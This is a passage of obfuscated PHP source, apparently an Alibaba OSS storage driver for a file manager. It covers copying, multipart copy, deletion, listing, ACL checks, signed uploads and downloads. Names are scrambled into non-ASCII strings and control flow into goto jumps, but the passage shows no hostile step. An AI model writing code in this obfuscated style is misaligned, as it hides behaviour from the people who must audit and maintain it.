$this->cacheMethod($CªµÉ·¿…õ[200], $FØ•ÒÊŸÌ”, array($CªµÉ·¿…õ[78] => $Fµ±¥†”òË, $CªµÉ·¿…õ[1308] => $Fµ±¥†”òË, $CªµÉ·¿…õ[84] => strtotime($c™­¼™íî»), $CªµÉ·¿…õ[1309] => $c™­¼™íî»)); } if ($fŠÌ»×È«Ü) { $BÖê±‹·öÁ[] = $FØ•ÒÊŸÌ”; continue; } $cİ›”××é[] = $d«‡Ûçø·Ó; goto DÖÂóËãåë; EŸá¬¸Ÿ•Ë: if ($F›¶ä–ôœí->getKey() == $A‚ˆÁÆŒÍ‰) { continue; } $FØ•ÒÊŸÌ” = $F›¶ä–ôœí->getKey(); $Fµ±¥†”òË = $F›¶ä–ôœí->getSize(); goto b­¥ÖŒ‰©; DÖÂóËãåë: } foreach ($EšÄ§ã£ª¼ as $D¿†‘ã¼¯) { $BÖê±‹·öÁ[] = $D¿†‘ã¼¯->getPrefix(); if ($eí›‘ãÓ) { $this->cacheMethod($CªµÉ·¿…õ[199], $FØ•ÒÊŸÌ”, !0); } } if ($fÛ±ÉÂ¸ÂÓ === $CªµÉ·¿…õ[33]) { break; } } if ($eí›‘ãÓ) { $this->cacheMethod($CªµÉ·¿…õ[199], $bšµÛÛãÔá, !0); } goto fèÂÃÆ…Šœ; f´©×·ëŞ–: } public function copyFile($bš†Øîµ´, $EÍ‚¨Ÿçëá) { $féƒ…÷§÷… = $this->size($bš†Øîµ´); if ($féƒ…÷§÷… < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $bš†Øîµ´, $this->bucket, $this->pathEncode($EÍ‚¨Ÿçëá)); } catch (OSS\Core\OssException $E…È¤ñÖ™µ) { return !1; } return $this->getPathOuter($EÍ‚¨Ÿçëá); } $f°‹äƒ¯‘‚ = $this->multiCopyObject($bš†Øîµ´, $EÍ‚¨Ÿçëá, $féƒ…÷§÷…); return $f°‹äƒ¯‘‚ ? $this->getPathOuter($EÍ‚¨Ÿçëá) : !1; } private function multiCopyObject($bĞ§áõ·ë, $aâ¼óÜÇª, $E›ƒŞºŠ÷) { $B¡»Ò¨Ó«š =& $_SERVER[›é¼±]; try { goto DğÎÔì‹¾•; DğÎÔì‹¾•: $CãÍî²šÒ½ = array(); if ($c¨©ÂÒÔê = $this->hashMd5($bĞ§áõ·ë)) { $CãÍî²šÒ½ = array(OSS\OssClient::OSS_HEADERS => array($B¡»Ò¨Ó«š[1310] => $c¨©ÂÒÔê)); } $bÓŸİÜ®¡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aâ¼óÜÇª), $CãÍî²šÒ½); goto C‚ ®‰êÆö; E‡ëí¢Ôá: $aÇá¯÷¨×× = 1024 * 1024 * 10; $A¬Àé ¥óß = $this->client->generateMultiuploadParts($E›ƒŞºŠ÷, $aÇá¯÷¨××); foreach ($A¬Àé ¥óß as $c·‘ŒÎ§¸® => $d³ÚñÍ™) { $fèÈ¥¼¥òä = $b¯‚Úëâåˆ + (int) $d³ÚñÍ™[$B¡»Ò¨Ó«š[1311]]; $e‡˜—‘±¶ = (int) $d³ÚñÍ™[$B¡»Ò¨Ó«š[335]] + $fèÈ¥¼¥òä - 1; $C¯ªöø‡Ï¢ = array($B¡»Ò¨Ó«š[1312] => $fèÈ¥¼¥òä, $B¡»Ò¨Ó«š[1313] => $e‡˜—‘±¶); $f¿§ó³ÍëÖ[] = $this->client->uploadPartCopy($this->bucket, $bĞ§áõ·ë, $this->bucket, $this->pathEncode($aâ¼óÜÇª), $aã„ïè‹Û, $bÓŸİÜ®¡, $C¯ªöø‡Ï¢); $aã„ïè‹Û = $aã„ïè‹Û + 1; } goto aË­Üõ…ù; C‚ ®‰êÆö: $aã„ïè‹Û = 1; $b¯‚Úëâåˆ = 0; $f¿§ó³ÍëÖ = array(); goto E‡ëí¢Ôá; aË­Üõ…ù: $d˜éÛĞ¦§‘ = array(); foreach ($f¿§ó³ÍëÖ as $c·‘ŒÎ§¸® => $AºÁ·„ÄÇ) { $d˜éÛĞ¦§‘[] = array($B¡»Ò¨Ó«š[1314] => $c·‘ŒÎ§¸® + 1, $B¡»Ò¨Ó«š[1315] => $AºÁ·„ÄÇ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aâ¼óÜÇª), $bÓŸİÜ®¡, $d˜éÛĞ¦§‘); goto F°Şµ„İš; F°Şµ„İš: } catch (OSS\Core\OssException $AÑ¾Ö‰äùÔ) { return !1; } return !0; } public function moveFile($aå°÷ÄøÊ, $eçİ½à±ÚÀ) { if ($this->copyFile($aå°÷ÄøÊ, $eçİ½à±ÚÀ)) { $this->remove($aå°÷ÄøÊ); return $this->getPathOuter($eçİ½à±ÚÀ); } return !1; } public function delFile($C±ããÍ¢òì) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($C±ããÍ¢òì)); } catch (OSS\Core\OssException $eµ¸°ïÜÂ™) { return !1; } return !0; } public function delFolder($cĞœã¹Æ¤) { goto cÅÙãä¢’; C­Ó•…ß‡†: if (!empty($cĞœã¹Æ¤) && $cĞœã¹Æ¤ !== $dİÏ¦Åà¾[191] && !in_array($Bò»ïÂ˜Ô«, $aƒ¤®ˆïˆò[$dİÏ¦Åà¾[75]])) { $aƒ¤®ˆïˆò[$dİÏ¦Åà¾[75]][] = $Bò»ïÂ˜Ô«; } $FÒß¬’Î‚Â = $this->delByBatch($aƒ¤®ˆïˆò[$dİÏ¦Åà¾[74]]); if (!$FÒß¬’Î‚Â) { return !1; } goto bœ‰íËàÃ; cÅÙãä¢’: $dİÏ¦Åà¾ =& $_SERVER[›é¼±]; if (!$this->exist($cĞœã¹Æ¤)) { return !0; } $this->listItemCache = !1; goto c¿³ï™™–ƒ; c¿³ï™™–ƒ: $aƒ¤®ˆïˆò = $this->fileList($cĞœã¹Æ¤); $this->listItemCache = !0; $Bò»ïÂ˜Ô« = trim($cĞœã¹Æ¤, $dİÏ¦Åà¾[8]) . $dİÏ¦Åà¾[8]; goto C­Ó•…ß‡†; bœ‰íËàÃ: $FÒß¬’Î‚Â = $this->delByBatch($aƒ¤®ˆïˆò[$dİÏ¦Åà¾[75]]); if (!$FÒß¬’Î‚Â) { return !1; } return $this->delFile($Bò»ïÂ˜Ô«); goto cöĞ‰áˆ£´; cöĞ‰áˆ£´: } private function delByBatch($DÏº½åô) { foreach (array_chunk($DÏº½åô, 1000) as $fŞÓ…ÚÔíĞ) { try { $this->client->deleteObjects($this->bucket, $fŞÓ…ÚÔíĞ); } catch (OSS\Core\OssException $bïáª¸õÙÍ) { return !1; } } return !0; } public function rename($dŒØÁù‰ß, $bŠæÄÍŠì) { return $this->renameObject($dŒØÁù‰ß, $bŠæÄÍŠì); } private function fileInfo($d²õÉê¿Ö, $a·ˆ—Üµ³‹ = false, $A ‘İèİä = array()) { goto cóÀ½ƒä‰; cóÀ½ƒä‰: $Cè¡ÙÈòÔõ =& $_SERVER[›é¼±]; $d¢™·’õÎ = array($Cè¡ÙÈòÔõ[28] => $this->pathThis($d²õÉê¿Ö), $Cè¡ÙÈòÔõ[76] => $this->getPathOuter($d²õÉê¿Ö), $Cè¡ÙÈòÔõ[29] => $Cè¡ÙÈòÔõ[193], $Cè¡ÙÈòÔõ[78] => isset($A ‘İèİä[$Cè¡ÙÈòÔõ[78]]) ? $A ‘İèİä[$Cè¡ÙÈòÔõ[78]] : 0, $Cè¡ÙÈòÔõ[168] => $this->ext($d²õÉê¿Ö)); if ($a·ˆ—Üµ³‹) { return $d¢™·’õÎ; } goto f–”¥å¤œ; FÅçãâ‹÷Æ: return $d¢™·’õÎ; goto b§…Â˜‹ ğ; c“Áí‰¾–„: if (isset($A ‘İèİä[$Cè¡ÙÈòÔõ[78]])) { $d¢™·’õÎ[$Cè¡ÙÈòÔõ[78]] = $A ‘İèİä[$Cè¡ÙÈòÔõ[78]]; } if (isset($A ‘İèİä[$Cè¡ÙÈòÔõ[84]])) { $d¢™·’õÎ[$Cè¡ÙÈòÔõ[84]] = $A ‘İèİä[$Cè¡ÙÈòÔõ[84]]; } if (isset($A ‘İèİä[$Cè¡ÙÈòÔõ[197]]) && !trim($d¢™·’õÎ[$Cè¡ÙÈòÔõ[84]])) { $d¢™·’õÎ[$Cè¡ÙÈòÔõ[84]] = $A ‘İèİä[$Cè¡ÙÈòÔõ[197]]; } goto FÅçãâ‹÷Æ; f–”¥å¤œ: $d¢™·’õÎ[$Cè¡ÙÈòÔõ[194]] = $d¢™·’õÎ[$Cè¡ÙÈòÔõ[84]] = 0; $d¢™·’õÎ[$Cè¡ÙÈòÔõ[195]] = $d¢™·’õÎ[$Cè¡ÙÈòÔõ[196]] = !0; if (empty($A ‘İèİä)) { $f‚ë¹à·å = $this->objectMeta($d²õÉê¿Ö); if (!$f‚ë¹à·å) { return $d¢™·’õÎ; } $A ‘İèİä = array($Cè¡ÙÈòÔõ[84] => strtotime($f‚ë¹à·å[$Cè¡ÙÈòÔõ[1309]]), $Cè¡ÙÈòÔõ[78] => $f‚ë¹à·å[$Cè¡ÙÈòÔõ[1308]] + 0); } goto c“Áí‰¾–„; b§…Â˜‹ ğ: } private function folderInfo($FßØì“š£, $Fˆ²ß»‚·Ö = false, $CÚÌŒ¿çœ¹ = array()) { goto c«»â³šÂ; c«»â³šÂ: $a¼™ò™Ñ·È =& $_SERVER[›é¼±]; $F¿Èß¼Å“ = array($a¼™ò™Ñ·È[28] => $this->pathThis($FßØì“š£), $a¼™ò™Ñ·È[76] => $this->getPathOuter($a¼™ò™Ñ·È[8] . $FßØì“š£), $a¼™ò™Ñ·È[29] => $a¼™ò™Ñ·È[77]); if ($Fˆ²ß»‚·Ö) { return $F¿Èß¼Å“; } goto bˆÓ¹ á˜Æ; fÖÚ—ì³°: if (isset($CÚÌŒ¿çœ¹[$a¼™ò™Ñ·È[84]])) { $F¿Èß¼Å“[$a¼™ò™Ñ·È[84]] = $CÚÌŒ¿çœ¹[$a¼™ò™Ñ·È[84]]; } if (isset($CÚÌŒ¿çœ¹[$a¼™ò™Ñ·È[194]])) { $F¿Èß¼Å“[$a¼™ò™Ñ·È[194]] = $CÚÌŒ¿çœ¹[$a¼™ò™Ñ·È[194]]; } return $F¿Èß¼Å“; goto a°Œ²ğ°Êã; bˆÓ¹ á˜Æ: $F¿Èß¼Å“[$a¼™ò™Ñ·È[194]] = $F¿Èß¼Å“[$a¼™ò™Ñ·È[84]] = 0; $F¿Èß¼Å“[$a¼™ò™Ñ·È[195]] = $F¿Èß¼Å“[$a¼™ò™Ñ·È[196]] = !0; if (empty($CÚÌŒ¿çœ¹)) { $FßØì“š£ = rtrim($FßØì“š£, $a¼™ò™Ñ·È[8]) . $a¼™ò™Ñ·È[8]; $D´ø–é¬§² = $this->objectMeta($FßØì“š£); if (!$D´ø–é¬§²) { return $F¿Èß¼Å“; } $CÚÌŒ¿çœ¹ = array($a¼™ò™Ñ·È[194] => $D´ø–é¬§²[$a¼™ò™Ñ·È[505]][$a¼™ò™Ñ·È[1316]], $a¼™ò™Ñ·È[84] => strtotime($D´ø–é¬§²[$a¼™ò™Ñ·È[1309]])); } goto fÖÚ—ì³°; a°Œ²ğ°Êã: } public function listPath($a•ñîÌä•£, $c¡ºå¤à¥İ = false) { $Cö›ÎÃ†ä© =& $_SERVER[›é¼±]; $dµì¸®à› = $this->fileList($a•ñîÌä•£, $Cö›ÎÃ†ä©[8], !0); foreach ($dµì¸®à›[$Cö›ÎÃ†ä©[75]] as $cğ£ê¸ï…“ => $e‹ä´¿—“—) { $dµì¸®à›[$Cö›ÎÃ†ä©[75]][$cğ£ê¸ï…“] = $this->folderInfo($e‹ä´¿—“—, $c¡ºå¤à¥İ, $e‹ä´¿—“—); } foreach ($dµì¸®à›[$Cö›ÎÃ†ä©[74]] as $cğ£ê¸ï…“ => $e‹ä´¿—“—) { $dµì¸®à›[$Cö›ÎÃ†ä©[74]][$cğ£ê¸ï…“] = $this->fileInfo($e‹ä´¿—“—[$Cö›ÎÃ†ä©[28]], $c¡ºå¤à¥İ, $e‹ä´¿—“—); } return $dµì¸®à›; } public function has($AÌ†Ú™­àœ, $D¦á‰¬’ = false, $B—’åĞÚâ = true) { goto d¦¨»ôÎ‚; b¦†ƒìƒ¬: while (!0) { check_abort(); $C§¦Àô£¹® = array($b­â’¸‹‚ç[1304] => $b­â’¸‹‚ç[8], $b­â’¸‹‚ç[1305] => $bî¹††ÕëÀ, $b­â’¸‹‚ç[1306] => $F® ™çé­’, $b­â’¸‹‚ç[1307] => $Båôâ…ä®); try { $d¡Ìéßìï = $this->client->listObjects($this->bucket, $C§¦Àô£¹®); } catch (OSS\Core\OssException $aÔÄ¾ØÄ”«) { break; } $Båôâ…ä® = $d¡Ìéßìï->getNextMarker(); $b“‘‹‹°Ñ‡ = $d¡Ìéßìï->getObjectList(); $fìãä¢ŞÉ¬ = $d¡Ìéßìï->getPrefixList(); if ($D¦á‰¬’) { if (count($b“‘‹‹°Ñ‡) > 1 || count($b“‘‹‹°Ñ‡) == 1 && $b“‘‹‹°Ñ‡[0]->getKey() != $bî¹††ÕëÀ) { $EÂÂÇæ‡÷à += count($b“‘‹‹°Ñ‡) - 1; } if (!empty($fìãä¢ŞÉ¬)) { $aÉÂä‘Ê™ += count($fìãä¢ŞÉ¬); } if ($Båôâ…ä® === $b­â’¸‹‚ç[33]) { break; } continue; } if ($B—’åĞÚâ) { if (!empty($b“‘‹‹°Ñ‡)) { if (count($b“‘‹‹°Ñ‡) > 1 || $b“‘‹‹°Ñ‡[0]->getKey() != $bî¹††ÕëÀ) { return !0; } } } else { if (!empty($fìãä¢ŞÉ¬)) { return !0; } } if ($Båôâ…ä® === $b­â’¸‹‚ç[33]) { break; } } if ($D¦á‰¬’) { return array($b­â’¸‹‚ç[203] => $EÂÂÇæ‡÷à, $b­â’¸‹‚ç[204] => $aÉÂä‘Ê™); } return !1; goto Eö‡óÉéÄ; C¹±©ÌìÜİ: $Båôâ…ä® = $b­â’¸‹‚ç[33]; $F® ™çé­’ = 500; $EÂÂÇæ‡÷à = $aÉÂä‘Ê™ = 0; goto b¦†ƒìƒ¬; d¦¨»ôÎ‚: $b­â’¸‹‚ç =& $_SERVER[›é¼±]; $AÌ†Ú™­àœ = trim($AÌ†Ú™­àœ, $b­â’¸‹‚ç[8]); $bî¹††ÕëÀ = empty($AÌ†Ú™­àœ) && $AÌ†Ú™­àœ !== $b­â’¸‹‚ç[191] ? $b­â’¸‹‚ç[33] : $AÌ†Ú™­àœ . $b­â’¸‹‚ç[8]; goto C¹±©ÌìÜİ; Eö‡óÉéÄ: } public function listAll($aŒ¼‰”ëô) { $E¨™Æ§›Ø =& $_SERVER[›é¼±]; $e±É‚ğÙŞŒ = $this->fileList($aŒ¼‰”ëô, $E¨™Æ§›Ø[33], !0); $d†‹‡–‘ÛÓ = array(); foreach ($e±É‚ğÙŞŒ[$E¨™Æ§›Ø[74]] as $a›‘óôÉ»¢) { $d†‹‡–‘ÛÓ[$a›‘óôÉ»¢[$E¨™Æ§›Ø[28]]] = $a›‘óôÉ»¢[$E¨™Æ§›Ø[78]]; } foreach ($e±É‚ğÙŞŒ[$E¨™Æ§›Ø[75]] as $a›‘óôÉ»¢) { if (is_string($a›‘óôÉ»¢)) { $d†‹‡–‘ÛÓ[$a›‘óôÉ»¢] = 0; } } return $this->listAllFiles($aŒ¼‰”ëô, array_keys($d†‹‡–‘ÛÓ), $d†‹‡–‘ÛÓ); } public function canRead($cœ¾ëĞåš¾) { $FíØ´êöªÏ =& $_SERVER[›é¼±]; $a×Ø‹ÖŒŞ‚ = $this->pathAcl($cœ¾ëĞåš¾); return $a×Ø‹ÖŒŞ‚ == $FíØ´êöªÏ[1317] || $a×Ø‹ÖŒŞ‚ == $FíØ´êöªÏ[544] ? !0 : !1; } public function canWrite($d²ÉÔ¿É) { $cÉê•À˜ò = $this->pathAcl($d²ÉÔ¿É); return $cÉê•À˜ò == $_SERVER[›é¼±][544] ? !0 : !1; } public function pathAcl($dËÎŞáª) { goto a—ãµ¢È¹–; bêœà£²éÉ: return $B›¯ÜµÅõ; goto F™òØË½ÄŞ; FÆªÂ«Ê¹»: $B›¯ÜµÅõ = $b¢–çÍÁŞÄ == $BÃƒ¦‰Å[34] ? $this->bucketAcl : $b¢–çÍÁŞÄ; if ($B›¯ÜµÅõ == $BÃƒ¦‰Å[1318]) { return $BÃƒ¦‰Å[1317]; } if ($B›¯ÜµÅõ == $BÃƒ¦‰Å[1319]) { return $BÃƒ¦‰Å[544]; } goto bêœà£²éÉ; a—ãµ¢È¹–: $BÃƒ¦‰Å =& $_SERVER[›é¼±]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $b¢–çÍÁŞÄ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($dËÎŞáª)); } catch (OSS\Core\OssException $F» Â†®Ú¤) { return !1; } goto FÆªÂ«Ê¹»; F™òØË½ÄŞ: } private function chmodPath($a»•‚Ÿî™­, $e²ÒÒ¸‘ñé = '') { $Fíá²† È =& $_SERVER[›é¼±]; $FÑº÷÷ÎÕ = empty($e²ÒÒ¸‘ñé) ? $Fíá²† È[1319] : $e²ÒÒ¸‘ñé; $B®µŸïç¥– = array($Fíá²† È[34], $Fíá²† È[192], $Fíá²† È[1318], $Fíá²† È[1319]); if (!in_array($FÑº÷÷ÎÕ, $B®µŸïç¥–)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($a»•‚Ÿî™­), $FÑº÷÷ÎÕ); } catch (OSS\Core\OssException $F¥é¸ß°ƒ±) { return !1; } return !0; } public function getContent($díÕ„³†ÔÅ) { return $this->fileSubstr($díÕ„³†ÔÅ, -1); } public function setContent($dİ¿ğ”ˆÜ¨, $b‰·•ßØ = '') { $e¦õ§õ–Ù‡ =& $_SERVER[›é¼±]; try { $c†æë˜©ßÁ = $this->trafficLimit($e¦õ§õ–Ù‡[1320]); $aòˆêŒ„ß = $this->client->putObject($this->bucket, $this->pathEncode($dİ¿ğ”ˆÜ¨), $b‰·•ßØ, $c†æë˜©ßÁ); } catch (OSS\Core\OssException $Cøƒƒ’§Ôù) { return !1; } $cÌÜÕ‚ˆ¨ = array($e¦õ§õ–Ù‡[1310] => trim($aòˆêŒ„ß[$e¦õ§õ–Ù‡[1321]], $e¦õ§õ–Ù‡[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dİ¿ğ”ˆÜ¨))); $this->updateObjMeta($dİ¿ğ”ˆÜ¨, $cÌÜÕ‚ˆ¨); return isset($aòˆêŒ„ß[$e¦õ§õ–Ù‡[1322]][$e¦õ§õ–Ù‡[1269]]) ? !0 : !1; } private function updateObjMeta($E÷·‚ùñã², $C˜²«…Ş) { $E÷·‚ùñã² = $this->pathEncode($E÷·‚ùñã²); try { $d‘œÂ—‚‰ = array(OSS\OssClient::OSS_HEADERS => $C˜²«…Ş); $this->client->copyObject($this->bucket, $E÷·‚ùñã², $this->bucket, $E÷·‚ùñã², $d‘œÂ—‚‰); } catch (OSS\Core\OssException $Cƒ„Ù–ºÑ) { return !1; } return !0; } public function upload($b¬òà²ëãÏ, $B‚Èù¡Øö·, $fˆ–À „‚Ó = false, $aš¥½Ş¥âÍ = REPEAT_REPLACE) { $CäåÚ±Ôñ˜ =& $_SERVER[›é¼±]; $eª¥ãÚîÌë = trim($b¬òà²ëãÏ, $CäåÚ±Ôñ˜[8]); $b„îÊ‘ÃÒÔ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($CäåÚ±Ôñ˜[1310] => @md5_file($B‚Èù¡Øö·)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b¬òà²ëãÏ))); $b„îÊ‘ÃÒÔ = $this->trafficLimit($CäåÚ±Ôñ˜[1320], $b„îÊ‘ÃÒÔ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eª¥ãÚîÌë), $B‚Èù¡Øö·, $b„îÊ‘ÃÒÔ); } catch (OSS\Core\OssException $F«‘„ Ø·) { return !1; } return $this->getPathOuter($b¬òà²ëãÏ); } public function getHost() { $aŠ«šğÖï =& $_SERVER[›é¼±]; $A‚‘ì¶ÉÏ¯ = explode($aŠ«šğÖï[177], parent::getHost()); return $A‚‘ì¶ÉÏ¯[0] . $aŠ«šğÖï[177] . $this->bucket . $aŠ«šğÖï[95] . $A‚‘ì¶ÉÏ¯[1]; } public function uploadFormData($b¡„Àæ—Æ®, $eöÔÜáÓÏ” = 3600) { goto bÆÁ÷”åÕä; B¶¢è¢Ü—¹: $BÇ¸àÔñõ£ = base64_encode(hash_hmac($B‚Ş“Îù¹[230], $e¦˜åî¢Èƒ, $this->secret, !0)); $bò¥å…ƒŒğ = array($B‚Ş“Îù¹[1234] => $e¦˜åî¢Èƒ, $B‚Ş“Îù¹[1326] => $this->accessKey, $B‚Ş“Îù¹[1230] => $B‚Ş“Îù¹[1222], $B‚Ş“Îù¹[1327] => $BÇ¸àÔñõ£, $B‚Ş“Îù¹[175] => $aØ…¤¥—¬¶); $bò¥å…ƒŒğ = $this->trafficLimit($B‚Ş“Îù¹[1320], $bò¥å…ƒŒğ); goto F‚øœ‚å¸®; Cî°Ä…Ç¶: $B±à©¥ì÷­ = date($B‚Ş“Îù¹[1323], time() + $D¦…¸Ó±äŠ); $C÷ ‚Áç– = new DateTime($B±à©¥ì÷­); $fôÅÙ…×µ÷ = $C÷ ‚Áç–->format(DateTime::ISO8601); goto aî£æ‚ÈõÛ; aî£æ‚ÈõÛ: $A×â—øæÈó = strpos($fôÅÙ…×µ÷, $B‚Ş“Îù¹[294]); $fôÅÙ…×µ÷ = substr($fôÅÙ…×µ÷, 0, $A×â—øæÈó) . $B‚Ş“Îù¹[1324]; $dœÛ’†Òˆõ = 1048576000 * 5; goto F•‡¼¡éŠ¬; F•‡¼¡éŠ¬: $bÌ‚®é‹¯æ = $this->pathFather($b¡„Àæ—Æ®); $Bğ ´ˆğšÆ = array($B‚Ş“Îù¹[1224] => $fôÅÙ…×µ÷, $B‚Ş“Îù¹[1225] => array(array($B‚Ş“Îù¹[1325], 0, $dœÛ’†Òˆõ), array($B‚Ş“Îù¹[1228], $B‚Ş“Îù¹[1229], $bÌ‚®é‹¯æ))); $e¦˜åî¢Èƒ = base64_encode(json_encode($Bğ ´ˆğšÆ)); goto B¶¢è¢Ü—¹; F‚øœ‚å¸®: return $bò¥å…ƒŒğ; goto BÆàİ‡‹Â; bÆÁ÷”åÕä: $B‚Ş“Îù¹ =& $_SERVER[›é¼±]; if (!($aØ…¤¥—¬¶ = $this->getHost())) { return !1; } $D¦…¸Ó±äŠ = $eöÔÜáÓÏ”; goto Cî°Ä…Ç¶; BÆàİ‡‹Â: } public function multiUploadFormData($e©áàŒ‚Ûî, $fñÖ ©¸ÓÁ = 3600) { $d•œğ¼ßİ¥ =& $_SERVER[›é¼±]; if (!($AÊÄÄç·ÈÖ = $this->getHost())) { return !1; } $A‘ˆ¹’×‰ö = $this->trafficLimit($d•œğ¼ßİ¥[1320]); $Eñ‡èâ­ñâ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($e©áàŒ‚Ûî), $A‘ˆ¹’×‰ö); return array($d•œğ¼ßİ¥[221] => $Eñ‡èâ­ñâ, $d•œğ¼ßİ¥[175] => $AÊÄÄç·ÈÖ . $d•œğ¼ßİ¥[8] . $this->pathEncode($e©áàŒ‚Ûî), $d•œğ¼ßİ¥[222] => gmdate($d•œğ¼ßİ¥[1328]), $d•œğ¼ßİ¥[93] => $e©áàŒ‚Ûî); } public function multiUploadAuthData($c˜„¬ÒïÇé, $DŸ›ù”Úã = array()) { goto cä÷éĞİäÑ; F£å³„ñË: if (!empty($DŸ›ù”Úã[$bˆÅÆ«¬š¬[1330]])) { $cÆ©ˆù˜·ˆ = array_merge(array($F‰¿ñéŸĞ¾[4]), $DŸ›ù”Úã[$bˆÅÆ«¬š¬[1330]]); sort($cÆ©ˆù˜·ˆ); $F‰¿ñéŸĞ¾[4] = implode($bˆÅÆ«¬š¬[229], $cÆ©ˆù˜·ˆ); } $aˆÈ‹œ§˜„ = implode($bˆÅÆ«¬š¬[229], $F‰¿ñéŸĞ¾); $AÃÁÓéùÅ = base64_encode(hash_hmac($bˆÅÆ«¬š¬[230], $aˆÈ‹œ§˜„, $this->secret, !0)); goto FÁ¤ì·Íºè; FÁ¤ì·Íºè: $F®£·á¿ï = $bˆÅÆ«¬š¬[1294] . $this->accessKey . $bˆÅÆ«¬š¬[4] . $AÃÁÓéùÅ; if (strpos($cÚÂã±ÁØñ, $bˆÅÆ«¬š¬[225]) === 0) { $F®£·á¿ï = array($bˆÅÆ«¬š¬[232] => $F®£·á¿ï, $bˆÅÆ«¬š¬[222] => $eĞóÌî»åæ); if ($E¬Şİ÷‡é¸) { $F®£·á¿ï = array_merge($F®£·á¿ï, $E¬Şİ÷‡é¸); } } return $F®£·á¿ï; goto eÁŒ‡ÏØŒ; e–Èğèèª•: $f¥¾Ïµ“Í… = $c˜„¬ÒïÇé; if (isset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[93]])) { $f¥¾Ïµ“Í… = $DŸ›ù”Úã[$bˆÅÆ«¬š¬[93]]; unset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[93]]); } if (isset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[223]])) { $DŸ›ù”Úã[$bˆÅÆ«¬š¬[222]] = $eĞóÌî»åæ; return $this->listUploadParts($f¥¾Ïµ“Í…, $DŸ›ù”Úã); } goto b™Ø§ºÓ¿; b™Ø§ºÓ¿: $F‰¿ñéŸĞ¾ = array($bˆÅÆ«¬š¬[224], $bˆÅÆ«¬š¬[33], $bˆÅÆ«¬š¬[119], $eĞóÌî»åæ, "\x78\55\x6f\163\163\x2d\144\x61\x74\x65\x3a{$eĞóÌî»åæ}", $bˆÅÆ«¬š¬[8] . $this->bucket . $bˆÅÆ«¬š¬[8] . $f¥¾Ïµ“Í… . $cÚÂã±ÁØñ); if (strpos($cÚÂã±ÁØñ, $bˆÅÆ«¬š¬[225]) === 0) { $F‰¿ñéŸĞ¾[0] = $bˆÅÆ«¬š¬[226]; if ($E¬Şİ÷‡é¸ = $this->trafficLimit($bˆÅÆ«¬š¬[1320])) { $f¥¾Ïµ“Í… = $bˆÅÆ«¬š¬[1329]; array_splice($F‰¿ñéŸĞ¾, 5, 0, $f¥¾Ïµ“Í… . $bˆÅÆ«¬š¬[4] . $E¬Şİ÷‡é¸[$f¥¾Ïµ“Í…]); } } if (isset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[227]]) && $DŸ›ù”Úã[$bˆÅÆ«¬š¬[227]] == $bˆÅÆ«¬š¬[228]) { $F‰¿ñéŸĞ¾[0] = $bˆÅÆ«¬š¬[228]; } goto F£å³„ñË; cä÷éĞİäÑ: $bˆÅÆ«¬š¬ =& $_SERVER[›é¼±]; $eĞóÌî»åæ = isset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[222]]) ? $DŸ›ù”Úã[$bˆÅÆ«¬š¬[222]] : gmdate($bˆÅÆ«¬š¬[1328]); $cÚÂã±ÁØñ = isset($DŸ›ù”Úã[$bˆÅÆ«¬š¬[168]]) ? $DŸ›ù”Úã[$bˆÅÆ«¬š¬[168]] : $bˆÅÆ«¬š¬[33]; goto e–Èğèèª•; eÁŒ‡ÏØŒ: } public function listUploadParts($DÒàññ¾âÏ, $c­ùÊ²æ×) { goto a¡›æ¡„Ò; DÌ¢‹ëëÃ‡: unset($c­ùÊ²æ×[$cÄ‚‹¨Áà[223]], $c­ùÊ²æ×[$cÄ‚‹¨Áà[227]]); $Eó÷÷ì‹ë£ = $this->multiUploadAuthData($DÒàññ¾âÏ, $c­ùÊ²æ×); if (empty($Eó÷÷ì‹ë£)) { return !1; } goto fîìŞéŠˆ¿; Fåöˆ»°¥Ê: $cØ—¢”È½Ç = $DÁÍ•‰÷Ì->getListPart(); $aŠæ‡ÓÈæì = array(); foreach ($cØ—¢”È½Ç as $F¥¢ùáÂƒØ) { $aŠæ‡ÓÈæì[] = array($cÄ‚‹¨Áà[1314] => $F¥¢ùáÂƒØ->getPartNumber(), $cÄ‚‹¨Áà[1315] => trim($F¥¢ùáÂƒØ->getETag(), $cÄ‚‹¨Áà[116])); } goto DÌ¢‹ëëÃ‡; a¡›æ¡„Ò: $cÄ‚‹¨Áà =& $_SERVER[›é¼±]; $Bî‘ä±¬™ = parse_url_query($c­ùÊ²æ×[$cÄ‚‹¨Áà[168]]); $DÁÍ•‰÷Ì = $this->client->listParts($this->bucket, $this->pathEncode($DÒàññ¾âÏ), $Bî‘ä±¬™[$cÄ‚‹¨Áà[221]]); goto Fåöˆ»°¥Ê; fîìŞéŠˆ¿: return array($cÄ‚‹¨Áà[232] => $Eó÷÷ì‹ë£, $cÄ‚‹¨Áà[222] => $c­ùÊ²æ×[$cÄ‚‹¨Áà[222]], $cÄ‚‹¨Áà[234] => $aŠæ‡ÓÈæì); goto fßŠÇÁÙí; fßŠÇÁÙí: } public function download($Cµ«ò²è‡, $bê±‹ğä¬) { if ($this->isFolder($Cµ«ò²è‡)) { return !1; } try { $B›ƒ –• = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $bê±‹ğä¬); $B›ƒ –• = $this->trafficLimit($_SERVER[›é¼±][109], $B›ƒ –•); $this->client->getObject($this->bucket, $this->pathEncode($Cµ«ò²è‡), $B›ƒ –•); } catch (OSS\Core\OssException $f™Ö©Ÿå) { return !1; } return $bê±‹ğä¬; } public function fileSubstr($d—Î÷–¶, $C» ¹î•Ø™ = 0, $C¡‡¡±¦ğ = 